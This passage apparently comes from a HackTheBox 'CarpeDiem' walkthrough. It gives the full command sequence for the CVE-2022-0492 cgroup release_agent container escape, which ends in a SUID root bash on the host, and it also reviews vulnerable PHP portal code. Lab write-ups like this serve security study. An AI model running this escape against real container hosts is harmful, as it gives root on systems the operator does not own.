### CVE-2022-0492 Background

A new container breakout, CVE-2022-0492 was made public in March 2022, a few months before CarpeDiem released on HackTheBox. [This writeup](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/) from Palo Alto’s Unit42 does a really nice job explaining it.

I did a [full post](/2021/05/17/digging-into-cgroups.html) on breaking down a `cgroup` escape that was used in Ready to get root from a container, including what `cgroups` are, and OverlayFS. This exploit will use a lot of the same features, so it’s worth reviewing that one.

In [Ready](/2021/05/15/htb-ready.html#enumeration-1), I knew the Docker container was running with the privileged flag. In this version, it gets access to a privileged process from an unprivileged process. From there, it’s very similar. Write a `release_agent` file that will run when a process in a cgroup terminates, and then start and end a process in that cgroup.

### Exploit

#### Note About Cleanup

There’s a very aggressive cleanup script running on this box every minute, so I’ll have to work fast to explore this technique. It sounds like this was necessary to keep the box from getting into an unexploitable state.

#### Find release\_agent

Following the commands in the post, I’ll show I don’t have `CAP_SYS_ADMIN` privileges in this container:

```

root@90c7f522b842:/var/www/html/backdrop# set $(cat /proc/$$/status | grep "CapEff:"); capsh --decode=$2
0x00000000a00425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_audit_write,cap_setfcap

```

I’ll use the `unshare` command to create a new user / cgroup namespaces, and then it is there:

```

root@90c7f522b842:/var/www/html/backdrop# unshare -UrmC bash
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
root@90c7f522b842:/var/www/html/backdrop# set $(cat /proc/$$/status | grep "CapEff:"); capsh --decode=$2
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read

```

Like in the post, I’ll mount the `rdma` cgroup:

```

root@90c7f522b842:/# mount -t cgroup -o rdma cgroup /mnt  
root@90c7f522b842:/# ls /mnt/                           
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks

```

The `release_agent` file is there, though currently 0 bytes. I’ll create a new crgroup in that folder:

```

root@90c7f522b842:/# mkdir /mnt/x
root@90c7f522b842:/# ls /mnt/x/
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks

```

Just creating the folder generates all the files for that group. I’ll set that group to notify on release:

```

root@90c7f522b842:/# echo 1 > /mnt/x/notify_on_release 

```

Following the same steps as [my previous post](/2021/05/17/digging-into-cgroups.html#configure-release), I’ll next identify the path on the host filesystem that maps into this container:

```

root@90c7f522b842:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@90c7f522b842:/# echo $host_path
/var/lib/docker/overlay2/e4ee513c84a45c4dc61a80642fbbddd4fd2d1145ec759bf4415b642bc17f383b/diff

```

So files in `/` in this container are located in that path on the host.

I’ll set `$host_path/cmd` as the command to run as the `release_agent`:

```

root@90c7f522b842:/# echo "$host_path/cmd" > /mnt/release_agent
root@90c7f522b842:/# cat /mnt/release_agent 
/var/lib/docker/overlay2/e4ee513c84a45c4dc61a80642fbbddd4fd2d1145ec759bf4415b642bc17f383b/diff/cmd

```

Now, when a process in this cgroup exits, the host will run `/var/lib/docker/overlay2/e4ee513c84a45c4dc61a80642fbbddd4fd2d1145ec759bf4415b642bc17f383b/diff/cmd`, which I can access in the root of this container.

#### Prep Payload

I’ll write simple payload to make a SUID copy of `bash` in a script named `cmd` and set it executable:

```

root@90c7f522b842:/# echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchmod 4755 /tmp/0xdf'
#!/bin/bash

cp /bin/bash /tmp/0xdf
chmod 4755 /tmp/0xdf
root@90c7f522b842:/# echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchmod 4755 /tmp/0xdf' > cmd
root@90c7f522b842:/# chmod +x cmd

```

#### Trigger Payload

Now I just need to trigger the payload. I’ll do this be running an `echo` that writes into `/mnt/x/cgroup.procs`. This is clever because the `$$` writes the PID of the process, so that process goes into the cgroup, and then immediately exits, triggering the `release_agent`.

```

root@90c7f522b842:/# sh -c "echo \$\$ > /mnt/x/cgroup.procs"

```

From a shell as hflaccus I can see `/tmp/0xdf`:

```

hflaccus@carpediem:~$ ls -l /tmp/0xdf
-rwsr-xr-x 1 root root 1183448 Nov 30 01:17 /tmp/0xdf

```

Running it (with `-p`) returns a shell with effective user id of root:

```

hflaccus@carpediem:~$ /tmp/0xdf -p
0xdf-5.0# id
uid=1000(hflaccus) gid=1000(hflaccus) euid=0(root) groups=1000(hflaccus)

```

And the root flag:

```

0xdf-5.0# cat root.txt
fc09405c************************

```

## Beyond Root

### PHP Filter Fail

When [looking at the potential file include in the Portal site](#failed-source-read), I am curious to know why the PHP filter doesn’t return the base64 encoded page source. Looking at `index.php` on the portal container, the start of the file explains it:

```

<?php require_once('config.php'); ?>
<!DOCTYPE html>
<html lang="en">
<?php require_once('inc/header.php') ?>
<body>
<?php require_once('inc/topBarNav.php') ?>
<?php $page = isset($_GET['p']) ? $_GET['p'] : 'home';  ?>
<?php
    if(!file_exists($page.".php") && !is_dir($page)){
            include '404.html';
    }elseif($page === "admin"){
            include 'home.php';
    }elseif(is_dir($page)){
            include $page.'/index.php';
    }
    else{
        include $page.'.php';

    }
?>

```

After a few generic `include` calls, it loads the `$_GET['p']` value into a variable named `$page`. Then it checks if `file_exists($page.".php")` or `is_dir($page)`, and if neither is true, then it returns 404. So when I pass it a filter, that isn’t a file or directory, so it just returns 404. I don’t see much I can do to exploit this code.

### Updating Other Users

As noted [above](#update-login_type), The POST to update a user’s data on the Portal admin page goes to `/classes/Master.php`, with `f=update_account`. This leads to the `update_account` function in that file:

```

        function update_account(){
                $_POST = sanitize_post($_POST);
                extract($_POST);
                $data = "";
                foreach($_POST as $k =>$v){
                        if(!in_array($k,array('password'))){
                                if(!empty($data)) $data .=",";
                                $data .= " `{$k}`='{$v}' ";
                        }
                }
                if(!empty($password)){
                        $password = md5($password);
                        if(!empty($data)) $data .=" , ";
                        $data .= " `password` = '{$password}' ";
                }
                $stmt = $this->conn->prepare("SELECT * FROM `users` where `username` = ?");
                $stmt->bind_param("s", $username);
                if($this->capture_err())
                        return $this->capture_err();
                if($stmt->execute() and $stmt->get_result()->num_rows > 0 and $username != $_SESSION['userdata']['username'] or $id != $_SESSION['userdata']['id']){
                        $resp['status'] = 'failed';
                        $resp['msg'] = "Username or ID already exists.";
                        return json_encode($resp);
                        exit;

                }else{
                        $stmt = $this->conn->prepare("UPDATE `users` set {$data} where id = ?");
                        $stmt->bind_param("i", $id);
                        $save = $stmt->execute();
                }
                if($save){
                        $resp['status'] = 'success';
                        if(empty($id))
                                $this->settings->set_flashdata('success',"Account successfully created.");
                        else
                                $this->settings->set_flashdata('success',"Account successfully updated.");
                        foreach($_POST as $k =>$v){
                                        $this->settings->set_userdata($k,$v);
                        }
                        $this->settings->set_userdata('id',$id);

                }else{
                        $resp['status'] = 'failed';
                        $resp['err'] = $this->conn->error."[{$sql}]";
                }
                return json_encode($resp);
        }

```

It uses the `username` field to fetch that user’s row from the DB. Then it runs:

```

if($stmt->execute() and $stmt->get_result()->num_rows > 0 and $username != $_SESSION['userdata']['username'] or $id != $_SESSION['userdata']['id']){
                        $resp['status'] = 'failed';
                        $resp['msg'] = "Username or ID already exists.";
                        return json_encode($resp);
                        exit;

```

If there are rows and the username or ID don’t match what’s in the cookie, it fails.

That error message doesn’t really match what’s happening, but there’s no rule it has to.

### heartbeat.sh

#### Identify Issue

When [looking at](#heartbeatsh) the `heartbeat.sh` script in the Backdrop container, I was puzzled by this check:

```

status=$(php /var/www/html/backdrop/core/scripts/backdrop.sh --root /var/www/html/backdrop https://localhost)
grep "Welcome to backdrop.carpediem.htb!" "$status"
if [[ "$?" != 0 ]]; then
        #something went wrong.  restoring from backup.
        cp /root/index.php /var/www/html/backdrop/index.php
fi

```

It will save the output of the script into `status`, and then run `grep "Welcome to backdrop.carpediem.htb!" "$status"`. What the author is trying to do is get the contents of a webpage, and then use `grep` to check if a given string is in it. Can you spot why this doesn’t work as written?

The [man page](https://man7.org/linux/man-pages/man1/grep.1.html) for `grep` shows the syntax is `grep [OPTION...] PATTERNS [FILE...]`. So it’s putting the contents of the file where the file should be. I can see this by running the script:

```

www-data@90c7f522b842:/$ /opt/heartbeat.sh
grep: <!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8" />
...[snip]...
</html>: File name too long
cp: cannot stat '/root/index.php': Permission denied

```

It’s treating the entire page as a file name, and then failing because that’s too long! It then complains that it’s trying to copy `/root/index.php`, but it can’t because this process isn’t running as root.

#### Fix Issue

With a root shell in the container, I’ll try to fix the script. The container doesn’t have `vim`, `vi`, `nano`, `pico`, or any other text editors that I can find. So I’ll use `sed`. After making a copy in case I screw it up, I’ll run this:

```

root@90c7f522b842:/opt# sed -i 's/grep "Welcome to backdrop.carpediem.htb!" "$status"/echo "$status" | grep "Welcome to backdrop.carpediem.htb!"/g' heartbeat.sh

```

`-i` means edit the file and save it back to the same file. It’s replacing the `grep` line with one that will `echo` the output and pipe it into `grep`.

Now when I run this, it reports the page is fine:

```

www-data@90c7f522b842:/$ /opt/heartbeat.sh
              <h2 class="block-title">Welcome to backdrop.carpediem.htb!</h2>

```

It simply prints the result of the `grep` and doesn’t try to copy a file that it can’t access.